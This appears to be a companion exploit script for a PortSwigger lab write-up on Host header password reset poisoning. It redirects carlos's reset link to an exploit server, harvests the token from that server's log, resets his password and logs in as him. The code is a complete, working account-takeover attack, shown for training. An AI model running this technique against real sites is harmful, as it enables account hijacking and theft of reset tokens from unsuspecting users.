#!/usr/bin/env python3
"""
Basic password reset poisoning
PortSwigger Web Security Academy -- HTTP Host Header Attacks

Companion script for the writeup: 01-basic-password-reset-poisoning.md

What this does:
    Submits a password reset request for carlos with the Host header pointed
    at our exploit server. The reset email builds its link from that Host
    header, so the token-bearing link goes out pointing at our server instead
    of the lab. We pull the leaked token from the exploit server's access
    log, use it against the real reset endpoint to set carlos's password,
    then log in as him. httpx sends the modified Host header fine here --
    it's a single clean replacement, not the ambiguous/duplicate header
    combinations later labs in this series need raw sockets for.

Usage:
    python 01-basic-password-reset-poisoning.py <lab-url>
    e.g. python 01-basic-password-reset-poisoning.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def _csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    home = client.get(lab_url)
    exploit_m = re.search(r'(https://exploit-[^/]+\.exploit-server\.net)', home.text)
    if not exploit_m:
        print("[-] Could not find exploit server link on the homepage.")
        return
    exploit_server = exploit_m.group(1)
    exploit_domain = exploit_server.replace("https://", "")
    print(f"[*] Exploit server: {exploit_domain}")

    csrf = _csrf(client, f"{lab_url}/forgot-password")

    r = client.post(
        f"{lab_url}/forgot-password",
        data={"csrf": csrf, "username": "carlos"},
        headers={"Host": exploit_domain},
    )
    print(f"[*] Poisoned reset request sent for carlos -- status={r.status_code}")

    print("[*] Waiting for carlos to click the link...")
    time.sleep(3)
    log_r = client.get(f"{exploit_server}/log")
    token_m = re.search(r'temp-forgot-password-token=([^&\s"]+)', log_r.text)
    if not token_m:
        print("[-] No token in exploit server log yet. Re-check /log manually.")
        return
    token = token_m.group(1)
    print(f"[+] Captured reset token: {token}")

    reset_page = client.get(f"{lab_url}/forgot-password?temp-forgot-password-token={token}")
    csrf_m = re.search(r'name="csrf"\s+value="([^"]+)"', reset_page.text)
    if not csrf_m:
        print("[-] Could not get CSRF token from the reset page.")
        return
    csrf = csrf_m.group(1)

    client.post(
        f"{lab_url}/forgot-password?temp-forgot-password-token={token}",
        data={
            "csrf": csrf,
            "temp-forgot-password-token": token,
            "new-password-1": "hacked123",
            "new-password-2": "hacked123",
        },
    )
    print("[*] carlos's password reset to hacked123")

    login_csrf = _csrf(client, f"{lab_url}/login")
    client.post(f"{lab_url}/login", data={
        "csrf": login_csrf, "username": "carlos", "password": "hacked123",
    })

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- logged in as carlos via poisoned reset link.")
    else:
        print("[-] Not solved yet -- inspect the login response.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
